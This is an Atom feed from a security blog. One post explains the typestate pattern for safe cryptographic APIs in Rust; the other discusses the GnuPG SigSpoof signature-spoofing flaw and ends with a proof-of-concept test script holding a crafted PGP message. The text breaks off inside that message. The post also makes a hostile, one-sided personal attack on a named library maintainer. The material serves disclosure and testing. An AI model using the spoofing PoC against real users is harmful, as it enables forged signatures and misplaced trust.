<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Patterns in the Void</title><link href="https://blog.patternsinthevoid.net/" rel="alternate"></link><link href="https://blog.patternsinthevoid.net/feeds/all.atom.xml" rel="self"></link><id>https://blog.patternsinthevoid.net/</id><updated>2020-09-14T16:01:00+00:00</updated><entry><title>Implementing As-Safe-As-Possible, Misuse-Resistant Cryptographic Libraries: Part I</title><link href="https://blog.patternsinthevoid.net/implementing-as-safe-as-possible-misuse-resistant-cryptographic-libraries-part-i.html" rel="alternate"></link><published>2020-09-14T16:01:00+00:00</published><updated>2020-09-14T16:01:00+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2020-09-14:/implementing-as-safe-as-possible-misuse-resistant-cryptographic-libraries-part-i.html</id><summary type="html">&lt;!-- Image: /static/images/2015/12/card.jpeg --&gt;



&lt;p&gt;Over the years, I&amp;#8217;ve discovered many techniques in learning how to design
as-safe-as-possible, misuse-resistant cryptographic libraries for some fairly
complex primitives, which I&amp;#8217;d like to share in the hopes that we can continue to
progress the state-of-the-art in cryptography towards greater safety at
decreased cost to both cryptographers and security engineers.  Time permitting,
I hope to eventually turn this into a series of&amp;nbsp;posts.&lt;/p&gt;
&lt;p&gt;The typestate pattern is one I&amp;#8217;ve greatly appreciated but didn&amp;#8217;t have a name for
before reading &lt;a href="http://cliffle.com/blog/rust-typestate/"&gt;this article&lt;/a&gt;.  I
highly recommend reading it, and I won&amp;#8217;t be reviewing it in detail here.  The
tl;dr is that you encode your state machine into a type system, such that invalid
state changes are caught at compile time rather than&amp;nbsp;runtime.&lt;/p&gt;


&lt;p&gt;Take, for example, this stubbed out implementation of a two-round distributed
key generation&amp;nbsp;protocol.&lt;/p&gt;
&lt;pre class="prettyprint lang-rust"&gt;
use curve25519_dalek::ristretto::RistrettoPoint;
use curve25519_dalek::scalar::Scalar;

pub struct Commitment(pub(crate) RistrettoPoint);
pub struct SecretKeyShard(pub(crate) Vec&lt;Scalar&gt;);
pub struct PublicKeyShard(pub(crate) Scalar);
pub struct ProofOfKnowledgeOfSecretKeyShard(pub(crate) Scalar, pub(crate) Scalar);

impl ProofOfKnowledgeOfSecretKeyShard {
    /// Prove in zero-knowledge a secret key.
    pub fn prove(
        secret: &amp;SecretKeyShard
    ) -&gt; ProofOfKnowledgeOfSecretKeyShard {
        // ...
    }

    /// Verify a proof of knowledge of a secret key.
    pub fn verify(
        &amp;self,
    ) -&gt; Result&lt;(), ()&gt; {
        // ...
    }
}

pub struct DistributedKeyGeneration {};

impl DistributedKeyGeneration {
    /// Generate a shard of the eventual shared secret, and form some
    /// commitments and a zero-knowledge proof regarding those secrets, in order
    /// to prevent rogue-key attacks, and send the commitments and proof to the
    /// other participants for checking.
    pub fn round_one_init(
    ) -&gt; (SecretKeyShard, ProofOfKnowledgeOfSecretKeyShard, Vec&lt;Commitment&gt;) {
        // ...
    }

    /// Check the commitments and proofs that were sent by the other participants.
    pub fn round_one_finish(
        proofs: &amp;Vec&lt;ProofOfKnowledgeOfSecretKeyShard&gt;,
    ) -&gt; Result&lt;(), ()&gt; {
        for proof in proofs.iter() {
            proof.verify()?;
        }
        // ...
    }

    /// Each participant uses their secret shard to evaluate a different shard
    /// of the eventual shared public key, which they send to each respective
    /// participant.
    pub fn round_two_init(
        secret: &amp;SecretKeyShard,
    ) -&gt; Vec&lt;PublicKeyShard&gt; {
        // ...
    }

    /// Verify the public shards received from the other participants, aborting
    /// on failure, then compute our long-lived signing key and a proof of its
    /// correctness.
    pub fn round_two_finish(
        secret: &amp;SecretKeyShard,
        public_shards: &amp;Vec&lt;PublicKeyShard&gt;,
        commitments: &amp;Vec&lt;Commitment&gt;,
    ) -&gt; Result&lt;(), ()&gt; {
        // ...
    }
}
&lt;/pre&gt;

&lt;p&gt;It&amp;#8217;s already doing better than many cryptographic APIs I&amp;#8217;ve seen in the&amp;nbsp;wild:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Rather than passing around blobby arrays of bytes, it&amp;#8217;s at least using the
  type system to do basic things, like ensuring that pieces of the secret key
  shards are kept separate and treated differently to the public key shards,
  even though they share the same underlying mathematical&amp;nbsp;objects.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It has basic documentation, stating what actions — outside the scope of this
  cryptographic library — should be done with the return values.  (E.g. &amp;#8220;send
  the commitments and proof to the other participants for&amp;nbsp;checking&amp;#8221;.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It attempts to use intuitive naming for types and variables, rather than
  condensing things in to nearly indecipherable acronyms, over — even worse —
  using inexplicable¹ single-letter function/variable&amp;nbsp;names.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;¹ &lt;span class="caps"&gt;IMHO&lt;/span&gt; it&amp;#8217;s okay to use single-letter variable names when mirroring the names
used in a paper, and leaving comments to make it clear what the object actually
is, however in all likelihood this isn&amp;#8217;t code that …&lt;/p&gt;</summary><content type="html">&lt;!-- Image: /static/images/2015/12/card.jpeg --&gt;



&lt;p&gt;Over the years, I&amp;#8217;ve discovered many techniques in learning how to design
as-safe-as-possible, misuse-resistant cryptographic libraries for some fairly
complex primitives, which I&amp;#8217;d like to share in the hopes that we can continue to
progress the state-of-the-art in cryptography towards greater safety at
decreased cost to both cryptographers and security engineers.  Time permitting,
I hope to eventually turn this into a series of&amp;nbsp;posts.&lt;/p&gt;
&lt;p&gt;The typestate pattern is one I&amp;#8217;ve greatly appreciated but didn&amp;#8217;t have a name for
before reading &lt;a href="http://cliffle.com/blog/rust-typestate/"&gt;this article&lt;/a&gt;.  I
highly recommend reading it, and I won&amp;#8217;t be reviewing it in detail here.  The
tl;dr is that you encode your state machine into a type system, such that invalid
state changes are caught at compile time rather than&amp;nbsp;runtime.&lt;/p&gt;


&lt;p&gt;Take, for example, this stubbed out implementation of a two-round distributed
key generation&amp;nbsp;protocol.&lt;/p&gt;
&lt;pre class="prettyprint lang-rust"&gt;
use curve25519_dalek::ristretto::RistrettoPoint;
use curve25519_dalek::scalar::Scalar;

pub struct Commitment(pub(crate) RistrettoPoint);
pub struct SecretKeyShard(pub(crate) Vec&lt;Scalar&gt;);
pub struct PublicKeyShard(pub(crate) Scalar);
pub struct ProofOfKnowledgeOfSecretKeyShard(pub(crate) Scalar, pub(crate) Scalar);

impl ProofOfKnowledgeOfSecretKeyShard {
    /// Prove in zero-knowledge a secret key.
    pub fn prove(
        secret: &amp;SecretKeyShard
    ) -&gt; ProofOfKnowledgeOfSecretKeyShard {
        // ...
    }

    /// Verify a proof of knowledge of a secret key.
    pub fn verify(
        &amp;self,
    ) -&gt; Result&lt;(), ()&gt; {
        // ...
    }
}

pub struct DistributedKeyGeneration {};

impl DistributedKeyGeneration {
    /// Generate a shard of the eventual shared secret, and form some
    /// commitments and a zero-knowledge proof regarding those secrets, in order
    /// to prevent rogue-key attacks, and send the commitments and proof to the
    /// other participants for checking.
    pub fn round_one_init(
    ) -&gt; (SecretKeyShard, ProofOfKnowledgeOfSecretKeyShard, Vec&lt;Commitment&gt;) {
        // ...
    }

    /// Check the commitments and proofs that were sent by the other participants.
    pub fn round_one_finish(
        proofs: &amp;Vec&lt;ProofOfKnowledgeOfSecretKeyShard&gt;,
    ) -&gt; Result&lt;(), ()&gt; {
        for proof in proofs.iter() {
            proof.verify()?;
        }
        // ...
    }

    /// Each participant uses their secret shard to evaluate a different shard
    /// of the eventual shared public key, which they send to each respective
    /// participant.
    pub fn round_two_init(
        secret: &amp;SecretKeyShard,
    ) -&gt; Vec&lt;PublicKeyShard&gt; {
        // ...
    }

    /// Verify the public shards received from the other participants, aborting
    /// on failure, then compute our long-lived signing key and a proof of its
    /// correctness.
    pub fn round_two_finish(
        secret: &amp;SecretKeyShard,
        public_shards: &amp;Vec&lt;PublicKeyShard&gt;,
        commitments: &amp;Vec&lt;Commitment&gt;,
    ) -&gt; Result&lt;(), ()&gt; {
        // ...
    }
}
&lt;/pre&gt;

&lt;p&gt;It&amp;#8217;s already doing better than many cryptographic APIs I&amp;#8217;ve seen in the&amp;nbsp;wild:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Rather than passing around blobby arrays of bytes, it&amp;#8217;s at least using the
  type system to do basic things, like ensuring that pieces of the secret key
  shards are kept separate and treated differently to the public key shards,
  even though they share the same underlying mathematical&amp;nbsp;objects.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It has basic documentation, stating what actions — outside the scope of this
  cryptographic library — should be done with the return values.  (E.g. &amp;#8220;send
  the commitments and proof to the other participants for&amp;nbsp;checking&amp;#8221;.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It attempts to use intuitive naming for types and variables, rather than
  condensing things in to nearly indecipherable acronyms, over — even worse —
  using inexplicable¹ single-letter function/variable&amp;nbsp;names.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;¹ &lt;span class="caps"&gt;IMHO&lt;/span&gt; it&amp;#8217;s okay to use single-letter variable names when mirroring the names
used in a paper, and leaving comments to make it clear what the object actually
is, however in all likelihood this isn&amp;#8217;t code that should be exposed to a
security&amp;nbsp;engineer.&lt;/p&gt;
&lt;p&gt;So how could it be&amp;nbsp;better?&lt;/p&gt;
&lt;p&gt;This is precisely where the typestate pattern shines.  The above code would
allow a developer to&amp;nbsp;do:&lt;/p&gt;
&lt;pre class="prettyprint lang-rust"&gt;
let (secret, nipk_of_secret, commitments) = DistributedKeyGeneration::round_one();

send_to_participants(nipk_of_secret, commitments);

let public = DistributedKeyGeneration::round_two_init(&amp;secret);
&lt;/pre&gt;

&lt;p&gt;Depending on the specifics of the protocol, skipping the call to
&lt;code&gt;DistributedKeyGeneration::round_one_finish()&lt;/code&gt; allows for a
&lt;a href="https://eprint.iacr.org/2018/417"&gt;rogue-key attack&lt;/a&gt;, where a rogue participant
creates a crafted public key shard which negates the contribution to a signature
from the targeted other&amp;nbsp;participant(s).&lt;/p&gt;
&lt;p&gt;Let&amp;#8217;s see instead how this known attack could be eliminated entirely &lt;i&gt;by
making it discoverable at compile-time&lt;/i&gt;.&lt;/p&gt;
&lt;pre class="prettyprint lang-rust"&gt;
use curve25519_dalek::ristretto::RistrettoPoint;
use curve25519_dalek::scalar::Scalar;

pub struct Commitment(pub(crate) RistrettoPoint);
pub struct SecretKeyShard(pub(crate) Vec&lt;Scalar&gt;);
pub struct PublicKeyShard(pub(crate) Scalar);
pub struct ProofOfKnowledgeOfSecretKeyShard(pub(crate) Scalar, pub(crate) Scalar);

impl ProofOfKnowledgeOfSecretKeyShard {
    /// Prove in zero-knowledge a secret key.
    pub fn prove(
        secret: &amp;SecretKeyShard
    ) -&gt; ProofOfKnowledgeOfSecretKeyShard {
        // ...
    }

    /// Verify a proof of knowledge of a secret key.
    pub fn verify(
        &amp;self,
    ) -&gt; Result&lt;(), ()&gt; {
        // ...
    }
}

pub type DistributeKeyGenerationState = DistributedKeyGenerationRound1;

pub struct DistributedKeyGenerationRound1 {
    pub(crate) secret_shards: SecretKeyShard,
    pub proof: ProofOfKnowledgeOfSecretKeyShard,
    pub commitments: Vec&lt;Commitment&gt;,
}; 

impl DistributedKeyGenerationRound1 {
    /// Generate a shard of the eventual shared secret, and form some
    /// commitments and a zero-knowledge proof regarding those secrets, in order
    /// to prevent rogue-key attacks, and send the commitments and proof to the
    /// other participants for checking.
    pub fn init(
    ) -&gt; DistributedKeyGenerationRound1 {
        // ...
    }

    /// Check the commitments and proofs that were sent by the other participants.
    /// Only progress to round 2 if the verifications passed.
    pub fn progress(
        &amp;self,
        proofs: &amp;Vec&lt;ProofOfKnowledgeOfSecretKeyShard&gt;,
    ) -&gt; Result&lt;DistributedKeyGenerationRound2, ()&gt; {
        for proof in proofs.iter() {
            proof.verify()?;
        }

        // ...

        Ok(DistributedKeyGenerationRound2a{ secret_shards: self.secret_shards.clone() }
    }
}

pub struct DistributedKeyGenerationRound2a {
    pub(crate) secret_shards: SecretKeyShard,
}

impl DistributedKeyGenerationRound2a {
    /// Each participant uses their secret shard to evaluate a different shard
    /// of the eventual shared public key, which they send to each respective
    /// participant.
    pub fn progress(
        &amp;self,
    ) -&gt; DistributedKeyGenerationRound2b {
        // ...
    }
}

pub struct DistributedKeyGenerationRound2b {
    pub(crate) secret_shards: SecretKeyShard,
    pub public_shards: Vec&lt;PublicKeyShard&gt;,
}

impl DistributedKeyGenerationRound2b {
    /// Verify the public shards received from the other participants, aborting
    /// on failure, then compute our long-lived signing key and a proof of its
    /// correctness.
    pub fn finish(
        &amp;self,
    ) -&gt; GroupPublicKey {
        // ...
    }
}

pub struct GroupPublicKey(pub RistrettoPoint);
&lt;/pre&gt;

&lt;p&gt;With these changes, the code of a security developer would likely look more like&amp;nbsp;this:&lt;/p&gt;
&lt;pre class="prettyprint lang-rust"&gt;
let state = DistributedKeyGeneration::init();

let proofs = collect_proofs_from_other_participants();

let state = state.progress(&amp;proofs)?.progress();

send_public_shards_to_other_participants(state.public_shards);

let group_public_key = state.progress();
&lt;/pre&gt;

&lt;p&gt;If any of the state machine update functions are ever called without the correct
context, the compiler catches the mistake, thus enforcing safety against
cryptographic attacks before they&amp;nbsp;occur.&lt;/p&gt;
&lt;p&gt;This is, albeit, a pretty trivial and simple toy example.  There are many other
things we could do with a decent type system to improve this code, including but
not limited&amp;nbsp;to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Providing a &lt;code&gt;RoundTwo&lt;/code&gt; trait for genericising over the two typestates in the
second round of the&amp;nbsp;protocol.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Using the &lt;a href="https://rust-lang.github.io/api-guidelines/future-proofing.html#sealed-traits-protect-against-downstream-implementations-c-sealed"&gt;the sealed design pattern&lt;/a&gt;
to prevent third parties from creating further implementations of valid
&lt;code&gt;RoundTwo&lt;/code&gt; states.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Avoiding repeated &lt;code&gt;clone()&lt;/code&gt;/&lt;code&gt;copy()&lt;/code&gt; of data in the state machine (e.g. the
&lt;code&gt;secret_shards&lt;/code&gt; which get copied multiple times in the above example) by abusing
yet another empty trait which is implemented for all typestates to store the
actual state in a heap-allocated pointer (e.g. &lt;code&gt;Box&amp;lt;ActualState&amp;gt;&lt;/code&gt;) which is
copied&amp;nbsp;instead.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you&amp;#8217;d like to see a more complex example of these design patterns all put
together, I have
&lt;a href="https://github.com/isislovecruft/ed25519-dalek/blob/9e44fb1c6e060bce9e54480ce1c7387d13c17b75/src/state.rs"&gt;a rough draft implementation&lt;/a&gt;
of the &lt;span class="caps"&gt;MSDL&lt;/span&gt; protocol from
&lt;a href="https://eprint.iacr.org/2018/483"&gt;&amp;#8220;Compact Multi-Signatures for Smaller Blockchains&amp;#8221;&lt;/a&gt;
by Boneh, Drijvers, and&amp;nbsp;Neven.&lt;/p&gt;
&lt;!--

further post ideas:
* two sets of documentation, or documentation in general, eg. never write a
  doctext you're not okay with someone copy-pasting

--&gt;</content><category term="hacking"></category><category term="cryptography"></category></entry><entry><title>Pretty Bad {Protocol,People}</title><link href="https://blog.patternsinthevoid.net/pretty-bad-protocolpeople.html" rel="alternate"></link><published>2018-06-13T15:29:00+00:00</published><updated>2018-06-13T20:55:00+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2018-06-13:/pretty-bad-protocolpeople.html</id><summary type="html">

&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; This vulnerability affects GnuPG and several plugins and wrapper
  libraries, including
  &lt;a href="https://bitbucket.org/vinay.sajip/python-gnupg/"&gt;Vinay Sajip&amp;#8217;s&lt;/a&gt;
  &amp;#8220;python-gnupg&amp;#8221; which I
  &lt;a href="https://github.com/isislovecruft/python-gnupg"&gt;rewrote&lt;/a&gt; many years ago after
  finding a shell injection vulnerability in his code.  His code is vulnerable
  to SigSpoof; mine&amp;nbsp;isn&amp;#8217;t.&lt;/p&gt;
&lt;p&gt;Markus Brinkmann, a NeoPG developer,
&lt;a href="https://neopg.io/blog/gpg-signature-spoof/"&gt;wrote about a recent signature spoofing vulnerability&lt;/a&gt;
in GnuPG which carried over into several downstream plugins and wrapper
libraries—largely due to GnuPG&amp;#8217;s interface design which uses file descriptors,
and only file descriptors, to speak a custom, potentially binary but often
ascii, order dependent line protocol, whose line order, keywords, number of
fields, and other details are subject to change between minor point versions of
GnuPG.  If that sounds like a special hell invented by some sort of unholy
crossing between &lt;span class="caps"&gt;RMS&lt;/span&gt; and a rabid howler monkey: welcome to working with (or
rather, more likely, around) the Terrible Idea Generator known as the GnuPG
development&amp;nbsp;team.&lt;/p&gt;


&lt;p&gt;As previously mentioned, while working with Riseup¹ folks on a project, we found
a shell injection vulnerability in
&lt;a href="https://bitbucket.org/vinay.sajip/python-gnupg/"&gt;Vinay Sajip&amp;#8217;s python-gnupg module&lt;/a&gt;
(the one that installs if you do &lt;code&gt;pip install python-gnupg&lt;/code&gt;; mine installs with
&lt;code&gt;pip install gnupg&lt;/code&gt;).  The fix was &lt;em&gt;not&lt;/em&gt; merely to remove &lt;code&gt;shell=True&lt;/code&gt; argument
passed to a call to &lt;code&gt;subprocess.Popen()&lt;/code&gt; as Vinay believed (and continues to
believe)—but instead, to
&lt;a href="https://github.com/isislovecruft/python-gnupg/blob/e82eb20d70d874b68858ccb686318ef3c1c07c8b/gnupg/_parsers.py#L127"&gt;sanitise all inputs&lt;/a&gt;
and
&lt;a href="https://github.com/isislovecruft/python-gnupg/blob/e82eb20d70d874b68858ccb686318ef3c1c07c8b/gnupg/_parsers.py#L246"&gt;whitelist available options&lt;/a&gt;.
There are hundreds of flags to the gnupg binary.  Some flags and options are
safe. Others can be, if you carefully sanitise their arguments.  Others must be
disallowed&amp;nbsp;entirely.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/isislovecruft/python-gnupg"&gt;My python-gnupg module&lt;/a&gt; isn&amp;#8217;t
vulnerable to SigSpoof, for several&amp;nbsp;reasons:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--no-options&lt;/code&gt; is passed by default.  So if you&amp;#8217;ve got something stupid in
   your &lt;code&gt;gpg.conf&lt;/code&gt; file, you&amp;#8217;ll still be fine while using my Python&amp;nbsp;module.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--verbose&lt;/code&gt; is not passed.  This means that my library doesn&amp;#8217;t have to wade
   throught a mixture of strange stderr and GnuPG status-fd messages on the same
   file descriptor.  You &lt;em&gt;could&lt;/em&gt; pass &lt;code&gt;--verbose&lt;/code&gt; to it manually, as it is in
   the list of allowable, whitelisted options, but the exploit still won&amp;#8217;t work,
   which brings us to our next&amp;nbsp;point:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;All inputs to, and outputs from, the gnupg binary are sanitised and then
   forced to conform to whitelists.  This means that, even if you did pass
   &lt;code&gt;--verbose&lt;/code&gt; manually, the filename trick won&amp;#8217;t work because there&amp;#8217;s no way to
   safely sanitise a filename, because filenames may be arbitrary&amp;nbsp;bytes.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Amusingly, the &lt;a href="https://gnupg.readthedocs.io/en/0.4.3/"&gt;front page&lt;/a&gt; of Vinay&amp;#8217;s
current documentation&amp;nbsp;states:&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:100%; margin: 1px;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2018/06/vinays-python-warning.png"&gt;
            &lt;img alt="" style="width: 500px;"
                 src="./static/images/2018/06/vinays-python-warning.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;Which beautifully demonstrates that Vinay still doesn&amp;#8217;t understand the
original bug report.  Additionally, not a single line of his original
code remains unchanged, as the bulk of it was badly written and
contained hidden&amp;nbsp;landmines.&lt;/p&gt;
&lt;p&gt;At the time I pointed out the vulnerability, Vinay argued that it wasn&amp;#8217;t a bug
until a working exploit for a Bitcoin exchange C&amp;amp;C server, which was
unfortunately running his code, was released.  Vinay released several versions
of his library at the time,
&lt;a href="http://seclists.org/oss-sec/2014/q1/243"&gt;without making the version controlled repo …&lt;/a&gt;&lt;/p&gt;</summary><content type="html">

&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; This vulnerability affects GnuPG and several plugins and wrapper
  libraries, including
  &lt;a href="https://bitbucket.org/vinay.sajip/python-gnupg/"&gt;Vinay Sajip&amp;#8217;s&lt;/a&gt;
  &amp;#8220;python-gnupg&amp;#8221; which I
  &lt;a href="https://github.com/isislovecruft/python-gnupg"&gt;rewrote&lt;/a&gt; many years ago after
  finding a shell injection vulnerability in his code.  His code is vulnerable
  to SigSpoof; mine&amp;nbsp;isn&amp;#8217;t.&lt;/p&gt;
&lt;p&gt;Markus Brinkmann, a NeoPG developer,
&lt;a href="https://neopg.io/blog/gpg-signature-spoof/"&gt;wrote about a recent signature spoofing vulnerability&lt;/a&gt;
in GnuPG which carried over into several downstream plugins and wrapper
libraries—largely due to GnuPG&amp;#8217;s interface design which uses file descriptors,
and only file descriptors, to speak a custom, potentially binary but often
ascii, order dependent line protocol, whose line order, keywords, number of
fields, and other details are subject to change between minor point versions of
GnuPG.  If that sounds like a special hell invented by some sort of unholy
crossing between &lt;span class="caps"&gt;RMS&lt;/span&gt; and a rabid howler monkey: welcome to working with (or
rather, more likely, around) the Terrible Idea Generator known as the GnuPG
development&amp;nbsp;team.&lt;/p&gt;


&lt;p&gt;As previously mentioned, while working with Riseup¹ folks on a project, we found
a shell injection vulnerability in
&lt;a href="https://bitbucket.org/vinay.sajip/python-gnupg/"&gt;Vinay Sajip&amp;#8217;s python-gnupg module&lt;/a&gt;
(the one that installs if you do &lt;code&gt;pip install python-gnupg&lt;/code&gt;; mine installs with
&lt;code&gt;pip install gnupg&lt;/code&gt;).  The fix was &lt;em&gt;not&lt;/em&gt; merely to remove &lt;code&gt;shell=True&lt;/code&gt; argument
passed to a call to &lt;code&gt;subprocess.Popen()&lt;/code&gt; as Vinay believed (and continues to
believe)—but instead, to
&lt;a href="https://github.com/isislovecruft/python-gnupg/blob/e82eb20d70d874b68858ccb686318ef3c1c07c8b/gnupg/_parsers.py#L127"&gt;sanitise all inputs&lt;/a&gt;
and
&lt;a href="https://github.com/isislovecruft/python-gnupg/blob/e82eb20d70d874b68858ccb686318ef3c1c07c8b/gnupg/_parsers.py#L246"&gt;whitelist available options&lt;/a&gt;.
There are hundreds of flags to the gnupg binary.  Some flags and options are
safe. Others can be, if you carefully sanitise their arguments.  Others must be
disallowed&amp;nbsp;entirely.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/isislovecruft/python-gnupg"&gt;My python-gnupg module&lt;/a&gt; isn&amp;#8217;t
vulnerable to SigSpoof, for several&amp;nbsp;reasons:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--no-options&lt;/code&gt; is passed by default.  So if you&amp;#8217;ve got something stupid in
   your &lt;code&gt;gpg.conf&lt;/code&gt; file, you&amp;#8217;ll still be fine while using my Python&amp;nbsp;module.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--verbose&lt;/code&gt; is not passed.  This means that my library doesn&amp;#8217;t have to wade
   throught a mixture of strange stderr and GnuPG status-fd messages on the same
   file descriptor.  You &lt;em&gt;could&lt;/em&gt; pass &lt;code&gt;--verbose&lt;/code&gt; to it manually, as it is in
   the list of allowable, whitelisted options, but the exploit still won&amp;#8217;t work,
   which brings us to our next&amp;nbsp;point:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;All inputs to, and outputs from, the gnupg binary are sanitised and then
   forced to conform to whitelists.  This means that, even if you did pass
   &lt;code&gt;--verbose&lt;/code&gt; manually, the filename trick won&amp;#8217;t work because there&amp;#8217;s no way to
   safely sanitise a filename, because filenames may be arbitrary&amp;nbsp;bytes.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Amusingly, the &lt;a href="https://gnupg.readthedocs.io/en/0.4.3/"&gt;front page&lt;/a&gt; of Vinay&amp;#8217;s
current documentation&amp;nbsp;states:&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:100%; margin: 1px;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2018/06/vinays-python-warning.png"&gt;
            &lt;img alt="" style="width: 500px;"
                 src="./static/images/2018/06/vinays-python-warning.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;Which beautifully demonstrates that Vinay still doesn&amp;#8217;t understand the
original bug report.  Additionally, not a single line of his original
code remains unchanged, as the bulk of it was badly written and
contained hidden&amp;nbsp;landmines.&lt;/p&gt;
&lt;p&gt;At the time I pointed out the vulnerability, Vinay argued that it wasn&amp;#8217;t a bug
until a working exploit for a Bitcoin exchange C&amp;amp;C server, which was
unfortunately running his code, was released.  Vinay released several versions
of his library at the time,
&lt;a href="http://seclists.org/oss-sec/2014/q1/243"&gt;without making the version controlled repo available&lt;/a&gt;,
meaning that for each new version he claimed to have &amp;#8220;fixed the bug&amp;#8221;, I had to
diff the tarballs to discover, unsurprisingly, that he had, in fact,&amp;nbsp;not.&lt;/p&gt;
&lt;p&gt;I find it difficult to convey how thoroughly unimpressed I am with men like
Vinay.  I volunteered the work, handed him an explanation and a solution, and
was ridiculed, told I was wrong, that I didn&amp;#8217;t understand, and ignored.  He&amp;#8217;s
still never credited me by name anywhere for finding the original bug.  Men like
this make me want to go write closed source code that none of you will ever see,
just so that I never have to deal with these &lt;span class="caps"&gt;GNU&lt;/span&gt;/Beardos ever again.  Have fun
with the bugs, Vinay, they&amp;#8217;ll certainly keep&amp;nbsp;coming.&lt;/p&gt;
&lt;h1&gt;Test it&amp;nbsp;yourself&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/5050d4e5a2d5f23ebf3471dd711e329b"&gt;Here is a script&lt;/a&gt;
which will print the status-fd output of GnuPG and test a spoofed signature
(PoC #1), a spoofed signature plus a falsely encrypted (i.e. appears to have been
encrypted to the user, when in fact no encryption was used) message (PoC #2),
and an additional method for signature spoofing (PoC&amp;nbsp;#3):&lt;/p&gt;
&lt;pre class="prettyprint lang-py"&gt;
    #!/usr/bin/env python
    #
    # Test whether python-gnupg (https://github.com/isislovecruft/python-gnupg),
    # is vulnerable to SigSpoof.
    #
    # Authors: isis agora lovecruft &lt;isis@patternsinthevoid.net&gt;

    from __future__ import print_function

    import gnupg

    # Set the gnupg log level to `--debug-level=guru` (lmao).
    log = gnupg._logger.create_logger(9)
    log.setLevel(9)

    # Create our gpg instance
    gpg = gnupg.GPG(binary="/usr/bin/gpg2")

    poc1msg = '''\
    -----BEGIN PGP MESSAGE-----

    hQIMAwxKj89n7yVcARAAkhbztv+rjtUZx4rSqpvlj8a9g+y+8ZOY8JhBFvJzVAXe
    tnBNDGmIAc9I9ewRgxwsgcCIlUuGYCSgFugWLYVPD+e0tyQwx76mpMZc5wqAMows
    mk2pavdYMD2FGePY9mCVDvpC8ldumVn2dgT0k2IIOVr8w29CRgzP8ONwAyFFr4Gw
    hZ82e+CLKMFOv7Aigp00D1esurNTzFN5MDJZqhQtPpXawexUjrl5GEsPtKLDkKyt
    iOR5HauLLlDPZJXhHqwrqbSKTpKJU9lztmFp3XVom6VgeCiHWcL0mYF2fcbzfJS/
    CjDFZqFmFPGUJSpdgDcGEGsalzk6o8RFtUvvmKtQLN9BglpYkyPXQiO8vCyS4xiN
    D0gjBxVSvvkdS7734FYxePkUDEOTQbPuJ+FzgMN6Jpp8hVopYbefVcU5bNIY4H2P
    9EAHgvX1AT+VtPPt0JxzQ5/UdXK5KE7O7zUtTJIkXd4hGFpWyZp8hTUEgqLHfHUw
    Qlso2hQ+xgqok1ruGRjYk7n48Uw89jYpBXCOJerZeQGrmGWEkuf1vonFVwddM/4p
    msPN9I6Ahf+Uth+U5rFO4Y2G5fk83saa6ZfM9qdZKgLLEOgXmyycAdSAq/vRRe1G
    z9W77qcuIdhi2dA6+CJBqkm97aYNvoQ4Mxt97e7nP5WijXwugumdMQ7oT1upIsbS
    wFQBov2rvuwWsqrw+kbPD+zedi0NP31BohjiEhBamohGkkh8gr4hPmiyJdm0TIfh
    GBo5z35kRQiJZ9DwmgxE+LnVWQvChEJt0NFuC5FqM5bBaOjR5b2QsYn5uZ5AnVTa
    OZj5HBaaZQqZod5FrGpVpmXG2+RThge8dCbx+CDdBWvLq99TppzcN5nGEHYaz41X
    1ZKRcpbUuixBn3juC6HN2iQq9BidAbpVWvTAYD4dH+/aio3fd+3wSCgHQnPRzxg9
